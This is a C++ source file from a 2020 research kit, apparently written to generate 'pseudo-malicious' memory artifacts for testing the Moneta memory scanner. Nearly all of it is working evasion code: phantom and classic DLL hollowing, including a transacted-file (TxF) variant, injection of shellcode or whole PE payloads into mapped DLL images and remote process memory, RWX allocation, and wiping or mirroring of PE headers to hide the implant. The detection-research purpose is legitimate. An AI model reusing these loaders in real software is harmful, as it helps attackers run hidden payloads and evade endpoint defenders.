/*
____________________________________________________________________________________________________
|                __  .__  _____               __     __   .__  __                                  |
| _____ ________/  |_|__|/ ____\____    _____/  |_  |  | _|__|/  |_                                |
| \__  \\_  __ \   __\  \   __\\__  \ _/ ___\   __\ |  |/ /  \   __\                               |
|  / __ \|  | \/|  | |  ||  |   / __ \\  \___|  |   |    <|  ||  |                                 |
| (____  /__|   |__| |__||__|  (____  /\___  >__|   |__|_ \__||__|                                 |
|      \/                           \/     \/            \/                                        |
|__________________________________________________________________________________________________|
| Pseudo-malicious memory artifact kit                                                             |
|--------------------------------------------------------------------------------------------------|
| https://www.forrest-orr.net/post/masking-malicious-memory-artifacts-part-ii-insights-from-moneta |
|--------------------------------------------------------------------------------------------------|
| Author: Forrest Orr - 2020                                                                       |
|--------------------------------------------------------------------------------------------------|
| Contact: forrest.orr@protonmail.com                                                              |
|--------------------------------------------------------------------------------------------------|
| Licensed under GNU GPLv3                                                                         |
|__________________________________________________________________________________________________|
| ## Features                                                                                      |
|                                                                                                  |
| ~ Generate dynamic image, mapped and private memory                                              |
| ~ Bootstrap PE files                                                                             |
| ~ Phantom and classic DLL hollowing                                                              |
| ~ Moating, header wiping, and header mirroring                                                   |
|__________________________________________________________________________________________________|

*/

#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include <winternl.h>
#include <Psapi.h>
#include <Shlwapi.h>
#include <Dbghelp.h>
#include <versionhelpers.h>
#include <string>
#include <vector>
#include <algorithm>

#include "BootstrapPe.h"
#include "Allocation.h"
#include "Stealth.h"
#include "Helper.h"

bool HollowDllImplant(const wchar_t* DllFilePath, uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pPayloadBuf, uint32_t dwPayloadBufSize, uint8_t** ppEntryPoint, Payload_t SelectedPayloadType, uint64_t qwImplantFlags, uint32_t dwMoatSize) {
	HANDLE hFile = INVALID_HANDLE_VALUE, hTransaction = INVALID_HANDLE_VALUE;
	NTSTATUS NtStatus;
	uint8_t* pFileBuf = nullptr;
	bool bHollowed = false;
	uint32_t dwRequiredSize = (dwPayloadBufSize + dwMoatSize);
	static HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	static NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
	static NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
	static NtCreateTransaction_t NtCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");

	//
	// Read the DLL to memory and check its headers to identify its image size.
	//

	if ((qwImplantFlags & IMPLANT_FLAG_TXF)) {
		OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };

		NtStatus = NtCreateTransaction(&hTransaction,
			TRANSACTION_ALL_ACCESS,
			&ObjAttr,
			nullptr,
			nullptr,
			0,
			0,
			0,
			nullptr,
			nullptr);

		if (NT_SUCCESS(NtStatus)) {
			hFile = CreateFileTransactedW(DllFilePath,
				GENERIC_WRITE | GENERIC_READ,
				0,
				nullptr,
				OPEN_EXISTING,
				FILE_ATTRIBUTE_NORMAL,
				nullptr,
				hTransaction,
				nullptr,
				nullptr);
		}
		else {
			printf("... failed to create transaction (error 0x%x)\r\n", NtStatus);
		}
	}
	else {
		hFile = CreateFileW(DllFilePath, GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
	}

	if (hFile != INVALID_HANDLE_VALUE) {
		uint32_t dwFileSize = GetFileSize(hFile, nullptr);
		uint32_t dwBytesRead = 0;

		pFileBuf = new uint8_t[dwFileSize];

		if (ReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, nullptr)) {
			if (*(uint16_t*)&pFileBuf[0] == 'ZM') {
				SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);

				IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pFileBuf;
				IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pFileBuf + pDosHdr->e_lfanew);
				IMAGE_SECTION_HEADER* pSectHdrs = (IMAGE_SECTION_HEADER*)((uint8_t*)&pNtHdrs->OptionalHeader + sizeof(IMAGE_OPTIONAL_HEADER));

				if (pNtHdrs->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC) {
					int32_t nCodeIndex = GetCodeSection(pNtHdrs, pSectHdrs, dwPayloadBufSize); // The need for this is threefold: 1) The section may be named .text, CODE, RT etc. 2) In PEs with two code sections (for example Windows PE with .text and RT) one may not be large enough but the other is. 3) There is no certainty that a section with a name such as .text will be +X in the PE headers. 

					if (SelectedPayloadType == Payload_t::None || (SelectedPayloadType == Payload_t::PE && dwRequiredSize < pNtHdrs->OptionalHeader.SizeOfImage) || (SelectedPayloadType == Payload_t::Shellcode && nCodeIndex != -1 && dwRequiredSize < (pSectHdrs + nCodeIndex)->Misc.VirtualSize)) {
						if ((!(qwImplantFlags & IMPLANT_FLAG_DOTNET) || pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR].VirtualAddress)) {
							bool bMapped = false;
							uint32_t dwCodeRva = 0;

							//
							// Found a DLL with sufficient image size: map an image view of it for hollowing.
							//

							if ((qwImplantFlags & IMPLANT_FLAG_ISOLATED_MAP)) {
								printf("... %ws - image size: %d - code section size: %d\r\n", DllFilePath, pNtHdrs->OptionalHeader.SizeOfImage, (pSectHdrs + nCodeIndex)->Misc.VirtualSize);

								bool bTxF_Valid = pPayloadBuf != nullptr ? false : true;

								if ((qwImplantFlags & IMPLANT_FLAG_TXF) && pPayloadBuf != nullptr) {
									//
									// For TxF, make the modifications to the file contents now prior to mapping.
									//

									uint32_t dwBytesWritten = 0;

									if (SelectedPayloadType == Payload_t::Shellcode) {
										//
										// Wipe the data directories that conflict with the code section
										//

										for (uint32_t dwX = 0; dwX < pNtHdrs->OptionalHeader.NumberOfRvaAndSizes; dwX++) {
											if (pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress >= (pSectHdrs + nCodeIndex)->VirtualAddress && pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress < ((pSectHdrs + nCodeIndex)->VirtualAddress + (pSectHdrs + nCodeIndex)->Misc.VirtualSize)) {
												pNtHdrs->OptionalHeader.DataDirectory[dwX].VirtualAddress = 0;
												pNtHdrs->OptionalHeader.DataDirectory[dwX].Size = 0;
											}
										}

										//
										// Find a range free of relocations large enough to accomodate the code.
										//

										bool bRangeFound = false;
										uint8_t* pRelocBuf = (uint8_t*)GetPAFromRVA(pFileBuf, pNtHdrs, pSectHdrs, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

										if (pRelocBuf != nullptr) {
											for (dwCodeRva = 0; !bRangeFound && dwCodeRva < (pSectHdrs + nCodeIndex)->Misc.VirtualSize; dwCodeRva += dwPayloadBufSize) {
												if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva, (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva + dwPayloadBufSize)) {
													bRangeFound = true;
													break;
												}
											}

											if (bRangeFound) {
												printf("... found a blank region with code section to accomodate payload at 0x%08x\r\n", dwCodeRva);
											}
											else {
												printf("... failed to identify a blank region large enough to accomodate payload\r\n");
											}

											memcpy(pFileBuf + (pSectHdrs + nCodeIndex)->PointerToRawData + dwCodeRva, pPayloadBuf, dwPayloadBufSize);

											if (WriteFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesWritten, nullptr)) {
												printf("... successfully modified TxF file content to include shellcode in its .text section.\r\n");
												bTxF_Valid = true;
											}
										}
										else {
											printf("... No relocation directory present.\r\n");
										}
									}
									else if (SelectedPayloadType == Payload_t::PE) {
										//
										// Since the PE is still physical, it does not need to be bootstrapped (Windows will do this for me when the section is created). Simply overwrite the target PE with the payload PE.
										//

										if (WriteFile(hFile, pPayloadBuf, dwPayloadBufSize, (PDWORD)&dwBytesWritten, nullptr)) {
											printf("... successfully modified TxF file content (overwritten with entire payload PE).\r\n");
											bTxF_Valid = true;
										}
									}
								}

								if (!(qwImplantFlags & IMPLANT_FLAG_TXF) || bTxF_Valid) {
									HANDLE hSection = nullptr; // Using SEC_IMAGE_NO_EXECUTE allocates one giant +R MEM_IMAGE region, which does not split into multiple different permissions even when +RW or +RX is set with VirtualProtect. Oddly, permissions can be changed and data written. When written, the single region which has a size equal to the mapped size but a commit size of 0, will go up to 4096 as a single page is written. The entire image region is always private.
									NtStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, nullptr, nullptr, PAGE_READONLY, SEC_IMAGE, hFile); // "The operating system does not call load-image notify routines when sections created with the SEC_IMAGE_NO_EXECUTE attribute are mapped to virtual memory." - https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nc-ntddk-pload_image_notify_routine

									if (NT_SUCCESS(NtStatus)) {
										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
										NtStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, nullptr, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.

										if (NT_SUCCESS(NtStatus)) {
											bMapped = true;
										}
										else {
											printf("... failed to create mapping of section (error 0x%08x)\r\n", NtStatus);
										}
									}
									else {
										printf("... failed to create section (error 0x%x)\r\n", NtStatus);
									}
								}
								else {
									printf("... TxF initialization failed.\r\n");
								}
							}
							else {
								*ppMapBuf = (uint8_t*)LoadLibraryW(DllFilePath);

								if (*ppMapBuf != nullptr) {
									MODULEINFO ModInfo = { 0 };

									printf("... successfully loaded %ws at 0x%p\r\n", DllFilePath, *ppMapBuf);

									if (GetModuleInformation(GetCurrentProcess(), (HMODULE)*ppMapBuf, &ModInfo, sizeof(ModInfo))) {
										printf("... successfully queried module size: %d\r\n", ModInfo.SizeOfImage);
										*pqwMapBufSize = ModInfo.SizeOfImage;
									}
									else {
										printf("... failed to query module info for %ws\r\n", DllFilePath);
										IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)*ppMapBuf;
										IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(*ppMapBuf + pDosHdr->e_lfanew);
										printf("... sizeOfImage: %d\r\n", pNtHdrs->OptionalHeader.SizeOfImage);
										*pqwMapBufSize = pNtHdrs->OptionalHeader.SizeOfImage;
									}

									bMapped = true;
								}
							}

							if (bMapped) {
								//
								// Implant the payload into the mapped image.
								//

								if ((qwImplantFlags & IMPLANT_FLAG_TXF)) {
									IMAGE_DOS_HEADER* pPayloadDosHdr = (IMAGE_DOS_HEADER*)*ppMapBuf;
									IMAGE_NT_HEADERS* pPayloadNtHdrs = (IMAGE_NT_HEADERS*)(*ppMapBuf + pPayloadDosHdr->e_lfanew);
									int32_t nImpCount = BootstrapImports(*ppMapBuf, false); // Section alignment, base relocations and section permissions will already be handled by mapping the view of the section. The only initialization that remains is the IAT module loads and thunks

									printf("... Bootstrapped %d imports into TxF hollowed image post-mapping.\r\n", nImpCount);
									*ppEntryPoint = (SelectedPayloadType == Payload_t::PE ? (*ppMapBuf + pPayloadNtHdrs->OptionalHeader.AddressOfEntryPoint) : (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress + dwCodeRva));

									if (SelectedPayloadType == Payload_t::Shellcode) {
										printf("... selected code section %s (index %d) for TxF hollowing.\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex);
									}

									bHollowed = true;
								}
								else if (*pqwMapBufSize >= dwRequiredSize) { // Verify that the mapped size is of sufficient size for the payload+moat. There are quirks to image mapping that can result in the image size not matching the mapped size.
									if (pPayloadBuf != nullptr) {
										if (SelectedPayloadType == Payload_t::Shellcode) {
											uint32_t dwOldProtect = 0;

											if ((qwImplantFlags & IMPLANT_FLAG_MOAT)) {
												*ppEntryPoint = (*ppMapBuf + dwMoatSize);

												if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
													memcpy(*ppEntryPoint, pPayloadBuf, dwPayloadBufSize);

													if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
														bHollowed = true;
													}
												}
											}
											else {
												MEMORY_BASIC_INFORMATION64 BasicInfo = { 0 };
												bool bValidSblock = true;

												*ppEntryPoint = (*ppMapBuf + (pSectHdrs + nCodeIndex)->VirtualAddress);
												printf("... selected code section %s (index %d) for hollowing at 0x%p\r\n", (pSectHdrs + nCodeIndex)->Name, nCodeIndex, *ppEntryPoint);

												//
												// In some cases (.NET commonly among them) the code section may carry the executable permission on disk, but after being mapped will lose this attribute and become readonly. Query the sblocks associated with the selected code hollow pointer and modify their permissions to include +X if needed.
												//

												if (VirtualQueryEx(GetCurrentProcess(), *ppEntryPoint, (MEMORY_BASIC_INFORMATION*)&BasicInfo, sizeof(MEMORY_BASIC_INFORMATION)) == sizeof(MEMORY_BASIC_INFORMATION)) {
													if ((*ppEntryPoint + dwPayloadBufSize) < ((uint8_t*)BasicInfo.BaseAddress + BasicInfo.RegionSize)) { // In the event that the code section has been split into multiple sblocks with varying different permissions, skip it and fail the hollowing.
														printf("... sblock at 0x%p has sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);

														if (BasicInfo.Protect != PAGE_EXECUTE_READ && BasicInfo.Protect != PAGE_EXECUTE_READWRITE && BasicInfo.Protect != PAGE_EXECUTE_WRITECOPY) {
															printf("... non-executable code section sblock.\r\n");

															if (BasicInfo.Protect == PAGE_READWRITE) {
																if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect)) {
																	bValidSblock = false;
																}
															}
															else {
																if (!VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
																	bValidSblock = false;
																}
															}
														}
													}
													else {
														printf("... sblock at 0x%p does not have sufficient size to include the entire payload.\r\n", BasicInfo.BaseAddress);
														bValidSblock = false;
													}
												}
												else {
													printf("... failed to query attributes of virtual memory corresponding to hollowed code at 0x%p\r\n", *ppEntryPoint);
													bValidSblock = false;
												}

												if (bValidSblock) {
													if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_READWRITE, (PDWORD)&dwOldProtect)) {
														memcpy(*ppEntryPoint, pPayloadBuf, dwPayloadBufSize);

														//if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect)) {
														if (VirtualProtect(*ppEntryPoint, dwPayloadBufSize, dwOldProtect, (PDWORD)&dwOldProtect)) {
															bHollowed = true;
														}
													}
												}
												else {
													printf("... sblock for code section to hollow is invalid, either due to multiple sblocks or an inability to reset its permissions correctly.\r\n");
												}
											}
										}
										else if (SelectedPayloadType == Payload_t::PE) {
											uint32_t dwNewPeImgSize = 0;
											uint8_t* pNewPeImageBase = nullptr, * pNewPeEntryPoint = nullptr;
											uint64_t qwMapBufSize;

											printf("... bootstrapping PE to hollowed image memory...\r\n");

											if (BootstrapPe((uint8_t*)pPayloadBuf, &pNewPeImageBase, &pNewPeEntryPoint, &dwNewPeImgSize, *ppMapBuf, *pqwMapBufSize, qwImplantFlags, dwMoatSize)) {
												printf("... bootstrap successful : 0x%p [%d bytes]\r\n", pNewPeImageBase, dwNewPeImgSize);
												bHollowed = true;
												*ppEntryPoint = pNewPeEntryPoint;
											}
											else {
												printf("... failed to bootstrap PE in to hollowed map view\r\n");
											}
										}
									}
									else {
										bHollowed = true;
									}

									if (bHollowed) {
										printf("... %ws - 0x%p [payload base: 0x%p] mapped size: %I64u\r\n", DllFilePath, *ppMapBuf, *ppEntryPoint, *pqwMapBufSize);
									}
								}
								else {
									printf("... mapped view size: %d | SizeOfImage: %d\r\n", *pqwMapBufSize, pNtHdrs->OptionalHeader.SizeOfImage);
								}

								//
								// Mirror the PE of the hollowed DLL onto the implant. This may be redundant if it was a shellcode implant, which will have already preserved the authentic PE headers.
								//

								if ((qwImplantFlags & IMPLANT_FLAG_MIRROR_PE_HDR)) {
									if (MirrorPeHdrs(pFileBuf, *ppMapBuf)) {
										printf("... successfully mirrored PE headers of %ws to implant\r\n", DllFilePath);
									}
									else {
										printf("... failed to mirror PE headers of %ws to implant\r\n", DllFilePath);
									}
								}

								if ((qwImplantFlags & IMPLANT_FLAG_WIPE_PE_HDR)) {
									if (WipePeHdrs(*ppMapBuf)) {
										printf("... successfully wiped PE headers of implant in allocated memory.\r\n");
									}
									else {
										printf("... failed to wipe PE headers of implant in allocated memory.\r\n");
									}
								}
							}
						} // else not a .NET DLL although required
					}
					else {
						printf("... module size of %d is too small to accomodate payload of size %d or code section size of %d too small\r\n", pNtHdrs->OptionalHeader.SizeOfImage, dwRequiredSize, nCodeIndex == -1 ? -1 : (pSectHdrs + nCodeIndex)->Misc.VirtualSize);
					}
				}
				else {
					printf("... invalid NT header magic\r\n");
				}
			}
			else {
				printf("... invalid MZ header\r\n");
			}
		}

		if (pFileBuf != nullptr) {
			delete[] pFileBuf;
		}

		if (hFile != INVALID_HANDLE_VALUE) {
			CloseHandle(hFile);
		}

		if (hTransaction != INVALID_HANDLE_VALUE) {
			CloseHandle(hTransaction);
		}
	}
	else {
		//printf("... failed to open handle to %ws (error %d)\r\n", DllFilePath, GetLastError());
	}

	if (pPayloadBuf == nullptr && ppEntryPoint != nullptr) {
		*ppEntryPoint = nullptr;
	}

	return bHollowed;
}

bool HollowDllScan(const wchar_t* TargetPath, uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pPayloadBuf, uint32_t dwPayloadBufSize, uint8_t** ppEntryPoint, Payload_t SelectedPayloadType, uint64_t qwImplantFlags, uint32_t dwMoatSize) {
	wchar_t PreviousDirectory[MAX_PATH] = { 0 }, CurrentDirectory[MAX_PATH] = { 0 };
	WIN32_FIND_DATAW Wfd = { 0 };
	HANDLE hFindData;
	bool bHollowed = false;

	GetCurrentDirectoryW(MAX_PATH, PreviousDirectory);

	if (SetCurrentDirectoryW(TargetPath)) {
		GetCurrentDirectoryW(MAX_PATH, CurrentDirectory);

		if ((hFindData = FindFirstFileW(L"*", &Wfd)) != INVALID_HANDLE_VALUE) {
			do {
				if (_wcsicmp(Wfd.cFileName, L".") != 0 && _wcsicmp(Wfd.cFileName, L"..") != 0) {
					if ((Wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
						bHollowed = HollowDllScan(Wfd.cFileName, ppMapBuf, pqwMapBufSize, pPayloadBuf, dwPayloadBufSize, ppEntryPoint, SelectedPayloadType, qwImplantFlags, dwMoatSize);
					}
					else if (_wcsicmp(Wfd.cFileName + wcslen(Wfd.cFileName) - 4, L".dll") == 0 && GetModuleHandleW(Wfd.cFileName) == nullptr) {
						wchar_t FilePath[MAX_PATH];

						wcscpy_s(FilePath, MAX_PATH, CurrentDirectory);
						wcscat_s(FilePath, MAX_PATH, L"\\");
						wcscat_s(FilePath, MAX_PATH, Wfd.cFileName);
						printf("DLL: %ws\r\n", FilePath);
						bHollowed = HollowDllImplant(FilePath, ppMapBuf, pqwMapBufSize, pPayloadBuf, dwPayloadBufSize, ppEntryPoint, SelectedPayloadType, qwImplantFlags, dwMoatSize);
					}
				}
			} while (!bHollowed && FindNextFileW(hFindData, &Wfd));
		} 

		FindClose(hFindData);
	}

	SetCurrentDirectoryW(PreviousDirectory);

	return bHollowed;
}

uint8_t* DynamicAllocImplant(HANDLE hProcess, bool bRemoteApi, uint8_t* pPayloadBuf, uint32_t dwPayloadSize, Payload_t SelectedPayloadType, uint64_t qwImplantFlags, uint8_t** ppAllocatedRegion, uint32_t dwMoatSize) {
	uint8_t* pImplantEntryPoint = nullptr;
	uint32_t dwOldProtect = 0, dwAllocatedRegionSize = dwPayloadSize;
	uint8_t* pAllocatedRegion = nullptr;
	static HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
	static NtCreateSection_t NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
	static NtMapViewOfSection_t NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");

	if (pPayloadBuf != nullptr) {
		if (SelectedPayloadType == Payload_t::PE) {
			IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pPayloadBuf;

			if (*(uint16_t*)&pPayloadBuf[0] == 'ZM') {
				IMAGE_NT_HEADERS* pNtHdrs = (IMAGE_NT_HEADERS*)(pPayloadBuf + pDosHdr->e_lfanew);
				dwAllocatedRegionSize = pNtHdrs->OptionalHeader.SizeOfImage;
			}
		}
	}

	if ((qwImplantFlags & IMPLANT_FLAG_MOAT)) {
		dwAllocatedRegionSize += dwMoatSize;
	}

	if ((qwImplantFlags & IMPLANT_FLAG_MEM_PRIVATE)) {
		pAllocatedRegion = (uint8_t*)VirtualAllocEx(
			hProcess,
			nullptr,
			dwAllocatedRegionSize,
			MEM_COMMIT | MEM_RESERVE,
			(qwImplantFlags & IMPLANT_FLAG_RW_RX) ? PAGE_READWRITE : PAGE_EXECUTE_READWRITE);
	}
	else if ((qwImplantFlags & IMPLANT_FLAG_MEM_MAPPED)) {
		LARGE_INTEGER SectionMaxSize = { 0,0 };
		NTSTATUS NtStatus;
		HANDLE hSection;
		size_t cbViewSize = 0;

		SectionMaxSize.LowPart = dwAllocatedRegionSize;

		NtStatus = NtCreateSection(
			&hSection,
			SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, // Protections up to the point of mapping a view of the section will not allow VirtualProtect modifications inconsistent with their initial allocation
			NULL, &SectionMaxSize,
			PAGE_EXECUTE_READWRITE,
			SEC_COMMIT,
			NULL);

		if (NT_SUCCESS(NtStatus)) {
			NtStatus = NtMapViewOfSection(
				hSection,
				hProcess,
				(void**)&pAllocatedRegion,
				NULL, NULL, NULL,
				(PSIZE_T)&cbViewSize,
				2,
				NULL,
				PAGE_EXECUTE_READWRITE); // This is more than an initial protection. Setting as +RW causes setting any +X on a region within the view to fail

			if (NT_SUCCESS(NtStatus)) {
				printf("... successfully allocated %d bytes of memory mapped from a view of the page file\r\n", cbViewSize);
			}
			else {
				printf("... failed to map view of page file section (error 0x%08x)\r\n", NtStatus);
			}
		}
	}

	if (pAllocatedRegion != nullptr) {
		printf("... allocated memory at 0x%p\r\n", pAllocatedRegion);

		if (SelectedPayloadType == Payload_t::Shellcode) {
			if (pPayloadBuf != nullptr) {
				uint32_t dwBytesWritten = 0;

				if (WriteProcessMemory(hProcess, pAllocatedRegion + ((qwImplantFlags & IMPLANT_FLAG_MOAT) ? dwMoatSize : 0), pPayloadBuf, dwPayloadSize, (PSIZE_T)&dwBytesWritten)) {
					pImplantEntryPoint = pAllocatedRegion + ((qwImplantFlags & IMPLANT_FLAG_MOAT) ? dwMoatSize : 0);
				}
			}

			if ((qwImplantFlags & IMPLANT_FLAG_RW_RX)) {
				VirtualProtectEx(hProcess, pAllocatedRegion, dwAllocatedRegionSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect);
			}
		}
		else if (SelectedPayloadType == Payload_t::PE) {
			if (pPayloadBuf != nullptr) {
				uint32_t dwNewPeImgSize = 0;
				uint8_t* pNewPeImageBase = nullptr, * pNewPeEntryPoint = nullptr;
				uint64_t qwMapBufSize;

				if (BootstrapPe((uint8_t*)pPayloadBuf, &pNewPeImageBase, &pNewPeEntryPoint, &dwNewPeImgSize, pAllocatedRegion, dwAllocatedRegionSize, qwImplantFlags, dwMoatSize)) {
					if ((qwImplantFlags & IMPLANT_FLAG_WIPE_PE_HDR)) {
						if (WipePeHdrs(pPayloadBuf)) {
							printf("... successfully wiped PE headers of implant in allocated memory.\r\n");
						}
						else {
							printf("... failed to wipe PE headers of implant in allocated memory.\r\n");
						}
					}

					if (!(qwImplantFlags & IMPLANT_FLAG_RW_RX)) {
						VirtualProtect(pNewPeImageBase, dwNewPeImgSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect);
						printf("... forced +RWX permissions on %d bytes of allocated payload memory.\r\n", dwNewPeImgSize);
					}

					pImplantEntryPoint = pNewPeEntryPoint;
				}
				else {
					printf("... failed to bootstrap PE.\r\n");
				}
			}
			else {
				if (!(qwImplantFlags & IMPLANT_FLAG_RW_RX)) {
					VirtualProtect(pAllocatedRegion, dwAllocatedRegionSize, PAGE_EXECUTE_READWRITE, (PDWORD)&dwOldProtect);
					printf("... forced +RWX permissions on %d bytes of allocated payload memory.\r\n", dwAllocatedRegionSize);
				}
				else {
					VirtualProtect(pAllocatedRegion, dwAllocatedRegionSize, PAGE_EXECUTE_READ, (PDWORD)&dwOldProtect);
					printf("... set +RW allocated shellcode region at 0x%p to +RX\r\n", pAllocatedRegion);
				}
			}
		}
	}

	if (ppAllocatedRegion != nullptr) {
		*ppAllocatedRegion = pAllocatedRegion;
	}

	return pImplantEntryPoint;
}